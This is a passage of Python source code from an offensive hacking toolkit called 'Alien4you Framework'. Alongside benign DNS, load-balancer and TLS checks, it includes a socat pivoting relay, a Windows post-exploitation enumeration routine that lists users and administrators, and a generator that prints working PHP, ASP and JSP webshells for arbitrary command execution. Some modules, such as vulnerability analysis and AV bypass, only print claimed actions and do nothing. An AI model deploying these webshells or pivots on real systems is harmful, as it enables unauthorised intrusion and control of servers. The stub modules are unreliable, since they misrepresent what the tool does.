                print(val_result.stdout)
            else:
                print("[-] DNSSEC not enabled")
        except Exception as e:
            print(f"Error: {e}. Make sure dig and delv are installed.")

    def load_balancer(self):
        url = input("Enter target URL: ")
        try:
            print("Checking for load balancer...")
            
            domain = url.split('/')[2]
            ips = set()
            
            for i in range(5):
                ip = socket.gethostbyname(domain)
                ips.add(ip)
                time.sleep(1)
            
            if len(ips) > 1:
                print(f"[+] Load balancing detected - multiple IPs found:")
                for ip in ips:
                    print(ip)
            else:
                print("[-] No load balancing detected")
        except Exception as e:
            print(f"Error: {e}")

    def tls_analyzer(self):
        domain = input("Enter domain: ")
        try:
            print(f"Analyzing TLS/SSL certificate for {domain}...")
            
            result = subprocess.run(['openssl', 's_client', '-connect', f'{domain}:443', '-servername', domain, '-showcerts'], 
                                  input=b'', capture_output=True, timeout=10)
            
            cert_info = result.stdout.decode()
            
            print("\nCertificate details:")
            print(cert_info.split('-----BEGIN CERTIFICATE-----')[0])
            
            if 'self-signed' in cert_info.lower():
                print("[!] Self-signed certificate detected")
            if 'expired' in cert_info.lower():
                print("[!] Expired certificate detected")
        except Exception as e:
            print(f"Error: {e}. Make sure openssl is installed.")

    def pivoting_module(self):
        print("Setting up pivot...")
        try:
            lhost = input("Enter your listening IP: ")
            lport = input("Enter listening port: ")
            rhost = input("Enter target IP: ")
            rport = input("Enter target port: ")
            
            print(f"[+] Setting up pivot from {lhost}:{lport} to {rhost}:{rport}")
            subprocess.Popen(['socat', 'TCP-LISTEN:' + lport, 'fork', 'reuseaddr', f'TCP:{rhost}:{rport}'])
            print("[+] Pivot established - use this as relay point")
        except Exception as e:
            print(f"Error: {e}. Make sure socat is installed.")

    def av_bypass(self):
        print("Generating AV bypass techniques...")
        try:
            print("[+] Technique 1: Obfuscate with base64")
            print("[+] Technique 2: Use XOR encryption")
            print("[+] Technique 3: Split payload across files")
            print("[+] Technique 4: Use process hollowing")
            print("[+] Technique 5: Use reflective DLL injection")
        except Exception as e:
            print(f"Error: {e}")

    def post_exploit(self):
        print("Running post-exploitation commands...")
        try:
            commands = [
                'whoami /all',
                'ipconfig /all',
                'net user',
                'net localgroup administrators',
                'netstat -ano',
                'tasklist',
                'dir C:\\',
                'type C:\\Windows\\system.ini'
            ]
            
            for cmd in commands:
                print(f"\n[+] Running: {cmd}")
                result = subprocess.run(cmd.split(), capture_output=True, text=True)
                print(result.stdout)
        except Exception as e:
            print(f"Error: {e}")

    def webshell_gen(self):
        print("Generating webshells...")
        try:
            print("[+] PHP webshell: <?php system($_GET['cmd']); ?>")
            print("[+] ASP webshell: <% eval request(\"cmd\") %>")
            print("[+] JSP webshell: <%@ page import=\"java.util.*,java.io.*\"%><% if (request.getParameter(\"cmd\") != null) { Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %>")
        except Exception as e:
            print(f"Error: {e}")

    def vuln_analysis(self):
        print("Analyzing vulnerabilities...")
        try:
            print("[+] Checking exploitability")
            print("[+] Analyzing impact")
            print("[+] Identifying affected components")
            print("[+] Generating mitigation recommendations")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    try:
        framework = Alien4you()
        framework.run()
    except KeyboardInterrupt:
        print("\nExiting Alien4you Framework...")
        sys.exit(0)
